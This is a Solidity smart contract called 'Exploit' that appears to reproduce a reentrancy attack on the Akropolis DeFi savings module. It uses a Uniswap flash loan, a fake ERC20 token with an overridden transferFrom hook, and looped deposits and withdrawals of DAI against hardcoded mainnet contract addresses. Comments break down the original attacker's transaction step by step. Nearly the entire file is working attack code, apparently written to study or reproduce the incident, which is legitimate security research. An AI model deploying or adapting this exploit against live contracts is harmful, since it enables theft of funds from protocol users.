//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./ISavingsModule.sol";
import "./IUniswapV2Pair.sol";
import "./ICurveFiProtocol_Y.sol";

contract Exploit is ERC20 {

// break down the tx from: https://oko.palkeo.com/0xe2307837524Db8961C4541f943598654240bd62f/calls_from/

// 1. calls savingsModule.poolTokenByProtocol 
// 2. calls balanceOf on dyPoolToken (why, maybe this is a loop?)
// 3. approves spending of contract's DAI by savingsModule
// 4. checks balance of DAI
// 5. calls savingsModule.deposit sending 5000000 of address(this)
// 6. re-entered into address(this).transferFrom, calls  savingsModule.deposit sending 24747400163735396272620 dai
// 7. now they transfer 1 dai, 1*10**18, to address(AkroYPool)
// 8. call savingsModule.normalizedBalance
// 9. calls balanceOf on dyPoolToken
// 10. calls savingsModule.withdraw for
//     - dnAmount: 49268.189080 × 10¹⁸ 
//     - _protocol: address(AkroYPool)
//     - token: DAI
//     - maxNAmount: 0
// 11. goto line 5 for one more loop.
// 12. approve 0.

    // AKRO contract
    ISavingsModule savingsModule = ISavingsModule(0x73fC3038B4cD8FfD07482b92a52Ea806505e5748);
    // DAI/WETH pair for flashloan
    IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    ERC20 dai = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); 
    ERC20 dyPool = ERC20(0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077); 
    ICurveFiProtocol_Y AkroYPool = ICurveFiProtocol_Y(0x7967adA2A32A633d5C055e2e075A83023B632B4e); 


    uint borrow = 25000*10**18; 
    uint deposit = 24000*10**18; // akro had a deposit cap per user I think it was 25,000.
    uint repay = (borrow * 100301) / 100000;
    uint dyPoolBalance;
    uint daiBalance;
    uint thisSupply = 500000;
    uint nDepositFake;
    uint nDepositDai;
    uint nBalance;
    uint loops;

    event ReEntered(bool);
    event ReTurned(bool);
    event GetLoan(bool);
    event DyPoolBalance(uint indexed state, uint indexed dyBalance);
    // state 0: start, should be 0
    // state 1: first, should be < 25000000000000000000000
    // state 2: second, should be > 45000000000000000000000
    // state 3: last, should be less than 24000000000000000000000

    constructor() payable ERC20("Exploit", "XPLT") {
        // approve the akro contract to transfer our DAI 
        dai.approve(address(savingsModule), uint(-1));
        // need to approve the akro contract to transfer our akro pool tokens
        dyPool.approve(address(savingsModule), uint(-1));
        address poolToken = savingsModule.poolTokenByProtocol(address(AkroYPool));
    }

    // call this to start the exploit
    function run(uint _loops) external {
        loops = _loops;
        // take out a dai loan:
        pair.swap(borrow, 0, address(this), "0x");
        // ^^ will call uniswapV2Call
    }

    function uniswapV2Call(address,uint,uint,bytes calldata) external {
        emit GetLoan(true);
       
        dyPoolBalance = dyPool.balanceOf(address(this));
        emit DyPoolBalance(0, dyPoolBalance);
        
        // prep savingsModule deposit of fake coin:
        uint[] memory amountsIn = new uint[](1);
        amountsIn[0] = thisSupply;
        address[] memory tokensIn = new address[](1);
        tokensIn[0] = address(this);        
        nDepositFake = savingsModule.deposit(address(AkroYPool), tokensIn, amountsIn);
        // ^ here we jump down to the malicious transfer from
       
        // below this we have returned from the malicious transfer from.
        emit ReTurned(true);
        nBalance = AkroYPool.normalizedBalance();
        dyPoolBalance = dyPool.balanceOf(address(this));
        emit DyPoolBalance(2, dyPoolBalance);

        savingsModule.withdraw(address(AkroYPool), address(dai), dyPoolBalance*99/100, 0);
        dyPoolBalance = dyPool.balanceOf(address(this));
        emit DyPoolBalance(3, dyPoolBalance);

        // if we want to run thru a few more iterations:
        for(uint i = 0;i < loops; i++){
            savingsModule.deposit(address(AkroYPool), tokensIn, amountsIn);
            dyPoolBalance = dyPool.balanceOf(address(this));
            savingsModule.withdraw(address(AkroYPool), address(dai), dyPoolBalance*99/100, 0);            
        }

        bool daiSuccess = dai.transfer(address(pair), repay);

    }

    // transferFrom, a.k.a. "Eye am the Captain now".
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        emit ReEntered(true);

        // prep savingsModule deposit of dai:
        // address[] memory tokensIn = new address[](1);
        // tokensIn[0] = address(dai);
        // uint[] memory amountsIn = new uint[](1);
        // amountsIn[0] = deposit;
        // nDepositDai = savingsModule.deposit(address(AkroYPool), tokensIn, amountsIn);

        // dyPoolBalance = dyPool.balanceOf(address(this));
        // emit DyPoolBalance(1, dyPoolBalance);

        return true;//dai.transferFrom(address(this), address(AkroYPool), 1*10**18);
        
    }    

    receive() external payable {}

}






























